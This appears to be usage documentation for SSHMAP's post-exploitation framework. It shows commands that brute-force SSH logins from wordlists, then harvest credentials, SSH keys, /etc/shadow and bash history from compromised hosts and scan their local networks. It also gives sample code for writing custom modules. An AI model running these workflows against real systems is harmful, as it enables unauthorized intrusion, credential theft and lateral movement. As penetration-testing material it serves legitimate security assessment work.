# Post-Exploitation Usage Examples

This document provides practical examples of using SSHMAP's post-exploitation framework.

## Table of Contents

1. [Basic Usage](#basic-usage)
2. [Integration with SSHMAP Scan](#integration-with-sshmap-scan)
3. [Creating Custom Modules](#creating-custom-modules)
4. [Advanced Scenarios](#advanced-scenarios)

## Basic Usage

### List Available Modules

See all available post-exploitation modules:

```bash
python3 sshmap_postexploit.py --list
```

Output:
```
Available Post-Exploitation Modules                            
┏━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Name         ┃ Class                   ┃ Description                                    ┃
┡━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ credfinder   │ CredentialsFinderModule │ Find potential credentials on the remote host. │
│ fileretrieve │ FileRetrievalModule     │ Retrieve files from remote host.               │
│ sysinfo      │ SystemInfoModule        │ Collect system information from remote host.   │
│ netscan      │ NetworkScanModule       │ Scan local network for other hosts.            │
└──────────────┴─────────────────────────┴────────────────────────────────────────────────┘
```

### Run a Single Module

Execute a specific module on a compromised host:

```bash
python3 sshmap_postexploit.py --hostname machine_name --module sysinfo
```

### Run All Modules

Execute all available modules on a target:

```bash
python3 sshmap_postexploit.py --hostname machine_name --all-modules
```

### Customize Output Directory

Specify where to save module results:

```bash
python3 sshmap_postexploit.py --hostname machine_name --module sysinfo --output /tmp/results
```

### Quiet Mode

Run modules without displaying results (still saves to files):

```bash
python3 sshmap_postexploit.py --hostname machine_name --all-modules --quiet
```

## Integration with SSHMAP Scan

### Automatic Post-Exploitation During Scan

Run post-exploitation modules automatically on all compromised hosts during an SSHMAP scan:

```bash
python3 SSHMAP.py \
    --targets targets.txt \
    --users wordlists/users.txt \
    --passwords wordlists/passwords.txt \
    --run-postexploit
```

This will:
1. Perform the normal SSH bruteforce attack
2. Automatically run ALL post-exploitation modules on each successfully compromised host
3. Save results to `output/postexploit/{hostname}/`

### Run Specific Modules During Scan

Run only specific modules during the scan:

```bash
python3 SSHMAP.py \
    --targets targets.txt \
    --users wordlists/users.txt \
    --passwords wordlists/passwords.txt \
    --run-postexploit \
    --postexploit-modules sysinfo credfinder
```

## Module Examples

### System Information Module

Collects basic system information:
- OS details and kernel version
- CPU and memory information
- Network interfaces
- Currently logged users
- System uptime

```bash
python3 sshmap_postexploit.py --hostname target_host --module sysinfo
```

Results saved to: `output/postexploit/{hostname}/{timestamp}_sysinfo.json`

### Credentials Finder Module

Searches for potential credentials:
- Bash history for passwords/API keys
- Environment variables with sensitive data
- SSH private keys
- Configuration files (.aws/credentials, .docker/config.json, etc.)

```bash
python3 sshmap_postexploit.py --hostname target_host --module credfinder
```

### File Retrieval Module

Retrieves important files from the system:
- /etc/passwd
- /etc/shadow (if accessible)
- SSH keys and configurations
- Bash history

```bash
python3 sshmap_postexploit.py --hostname target_host --module fileretrieve
```

Files are saved to: `output/retrieved_files/{hostname}/`

### Network Scanner Module

Discovers other hosts on the local network:
- Network interfaces and IP addresses
- ARP table entries
- Ping sweep results (if available)
- Available scanning tools

```bash
python3 sshmap_postexploit.py --hostname target_host --module netscan
```

## Creating Custom Modules

### Simple Command Module

Create a module that runs a custom command:

```python
# modules/postexploit/modules/whoami.py
from typing import Dict, Any
from modules.postexploit.base_module import BaseModule

class WhoAmIModule(BaseModule):
    _name = "whoami"
    
    @property
    def name(self):
        return "whoami"
    
    @property
    def description(self):
        return "Get current user information"
    
    @property
    def category(self):
        return "recon"
    
    async def run(self) -> Dict[str, Any]:
        hostname = self.get_hostname()
        self.log_info(f"Getting user info from {hostname}")
        
        try:
            user = await self.execute_command("whoami")
            uid = await self.execute_command("id")
            groups = await self.execute_command("groups")
            
            return {
                'success': True,
                'hostname': hostname,
                'data': {
                    'user': user.strip(),
                    'uid': uid.strip(),
                    'groups': groups.strip()
                }
            }
        except Exception as e:
            return {
                'success': False,
                'hostname': hostname,
                'error': str(e)
            }
```

The module will be automatically discovered and available:

```bash
python3 sshmap_postexploit.py --list
# Will now show 'whoami' module

python3 sshmap_postexploit.py --hostname target_host --module whoami
```

### Module with Parameters

Create a module that accepts custom parameters:

```python
# modules/postexploit/modules/process_check.py
from typing import Dict, Any
from modules.postexploit.base_module import BaseModule

class ProcessCheckModule(BaseModule):
    _name = "proccheck"
    
    def __init__(self, ssh_session, process_name="sshd"):
        super().__init__(ssh_session)
        self.process_name = process_name
    
    @property
    def name(self):
        return "proccheck"
    
    @property
    def description(self):
        return "Check if a specific process is running"
    
    @property
    def category(self):
        return "recon"
    
    async def run(self) -> Dict[str, Any]:
        hostname = self.get_hostname()
        self.log_info(f"Checking for process '{self.process_name}' on {hostname}")
        
        try:
            # Check if process exists
            check_cmd = f"pgrep -l {self.process_name}"
            output = await self.execute_command(check_cmd)
            
            if output.strip():
                processes = output.strip().split('\n')
                self.log_success(f"Found {len(processes)} instances of {self.process_name}")
                
                return {
                    'success': True,
                    'hostname': hostname,
                    'data': {
                        'process_name': self.process_name,
                        'running': True,
                        'count': len(processes),
                        'processes': processes
                    }
                }
            else:
                self.log_info(f"Process {self.process_name} not found")
                return {
                    'success': True,
                    'hostname': hostname,
                    'data': {
                        'process_name': self.process_name,
                        'running': False
                    }
                }
                
        except Exception as e:
            return {
                'success': False,
                'hostname': hostname,
                'error': str(e)
            }
```

Use programmatically with custom parameters:

```python
from modules.postexploit.runner import ModuleRunner
from modules.SSHSessionManager import SSHSessionManager

# ... get ssh_session ...

runner = ModuleRunner()
result = await runner.run_module(
    "proccheck",
    ssh_session,
    process_name="apache2"  # Custom parameter
)
```

## Advanced Scenarios

### Sequential Module Execution

Run modules in a specific order for a complete assessment:

```bash
# 1. Gather system information
python3 sshmap_postexploit.py --hostname target --module sysinfo

# 2. Search for credentials
python3 sshmap_postexploit.py --hostname target --module credfinder

# 3. Scan the local network
python3 sshmap_postexploit.py --hostname target --module netscan

# 4. Retrieve important files
python3 sshmap_postexploit.py --hostname target --module fileretrieve
```

### Full Network Assessment

Combine SSHMAP scanning with post-exploitation:

```bash
# Scan network, compromise hosts, and run all post-exploitation modules
python3 SSHMAP.py \
    --targets network_targets.txt \
    --users usernames.txt \
    --passwords passwords.txt \
    --keys wordlists/keys/ \
    --maxdepth 3 \
    --run-postexploit \
    --log \
    --log-file assessment_$(date +%Y%m%d).log
```

This performs a complete assessment:
1. Bruteforce SSH on all targets
2. Map the network topology
3. Automatically run post-exploitation on all compromised hosts
4. Log everything to a file

### Custom Module Pipeline

Create a Python script to run custom module combinations:

```python
# custom_assessment.py
import asyncio
from modules.SSHSessionManager import SSHSessionManager
from modules.postexploit.runner import ModuleRunner
from modules.credential_store import CredentialStore
from modules.graphdb import GraphDB
from modules.config import CONFIG

async def assess_host(hostname):
    # Initialize components
    graph = GraphDB(CONFIG["neo4j_uri"], CONFIG["neo4j_user"], CONFIG["neo4j_pass"])
    credential_store = CredentialStore("wordlists/credentials.csv")
    ssh_manager = SSHSessionManager(graphdb=graph, credential_store=credential_store)
    runner = ModuleRunner()
    
    # Get SSH session
    local_hostname = "attacker_machine"
    ssh_session = await ssh_manager.get_session(hostname, local_hostname)
    
    # Run custom module sequence
    modules = ["sysinfo", "credfinder", "netscan"]
    results = await runner.run_multiple_modules(modules, ssh_session)
    
    print(f"Assessment complete for {hostname}")
    print(f"Successful modules: {results['summary']['successful']}")
    print(f"Failed modules: {results['summary']['failed']}")
    
    graph.close()

if __name__ == "__main__":
    asyncio.run(assess_host("target_host"))
```

## Output Files

### JSON Results

All module results are saved as JSON files:

```
output/postexploit/
├── machine1/
│   ├── 20260109_120000_sysinfo.json
│   ├── 20260109_120030_credfinder.json
│   └── 20260109_120100_combined.json
└── machine2/
    └── 20260109_120200_sysinfo.json
```

### Retrieved Files

Files retrieved by the `fileretrieve` module:

```
output/retrieved_files/
├── machine1/
│   ├── etc/
│   │   ├── passwd
│   │   └── hosts
│   └── home/
│       └── user/
│           └── .bash_history
└── machine2/
    └── etc/
        └── passwd
```

## Best Practices

1. **Start with reconnaissance modules** (sysinfo, netscan) before running more invasive modules
2. **Use --quiet mode** in automated scenarios to avoid output clutter
3. **Check results files** regularly - they contain detailed JSON data
4. **Custom modules should handle errors gracefully** - don't crash on missing commands
5. **Test modules individually** before running --all-modules
6. **Review retrieved files** for sensitive data before storing long-term

## Troubleshooting

### Module Not Found

If a module doesn't appear in the list:
1. Check the file is in `modules/postexploit/modules/`
2. Verify it inherits from `BaseModule`
3. Ensure `_name` class variable is set
4. Check for Python syntax errors

### Module Fails to Run

Common issues:
1. Target host doesn't have required commands (e.g., `ip`, `netstat`)
2. Insufficient permissions to access files/directories
3. Firewall blocking network scanning

The modules are designed to fail gracefully - partial results are better than no results.

## See Also

- [Module Development Guide](MODULE_DEVELOPMENT.md) - Complete guide to creating modules
- [SSHMAP README](../README.md) - Main documentation
- [Test Examples](../tests/test_postexploit.py) - Unit test examples
